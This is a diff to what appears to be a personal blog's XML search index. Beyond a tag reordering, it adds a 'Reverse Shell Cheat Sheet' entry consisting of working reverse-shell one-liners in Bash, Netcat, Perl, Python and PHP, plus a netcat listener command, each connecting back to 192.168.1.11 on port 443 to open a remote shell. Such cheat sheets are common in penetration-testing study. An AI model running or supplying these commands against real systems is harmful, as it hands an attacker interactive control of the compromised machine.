@@ -69,8 +69,8 @@
         <category>笔记</category>
       </categories>
       <tags>
-        <tag>linux</tag>
         <tag>bash</tag>
+        <tag>linux</tag>
         <tag>sh</tag>
       </tags>
   </entry>
@@ -97,6 +97,21 @@
         <tag>kali</tag>
         <tag>NVIDIA</tag>
         <tag>驱动</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Reverse Shell Cheat Sheet]]></title>
+    <url>%2F2018%2F01%2F10%2FReverse%20Shell%20Cheat%20Sheet%2F</url>
+    <content type="text"><![CDATA[set a listener: nc -nvlp 443 Bash: bash -i &gt;&amp; /dev/tcp/192.168.1.11/443 0&gt;&amp;1 Netcat nc -nv 192.168.1.11 443 -e /bin/bash ##linux nc.exe -nv 192.168.1.11 443 -e cmd ##windows Perl perl -e &apos;use Socket;$i=&quot;192.168.1.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S ,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot; /bin/bash -i&quot;);};&apos; Python python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP php -r &apos;$sock=fsockopen(&quot;192.168.1.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;]]></content>
+      <categories>
+        <category>shell</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>bash</tag>
+        <tag>perl</tag>
+        <tag>netcat</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
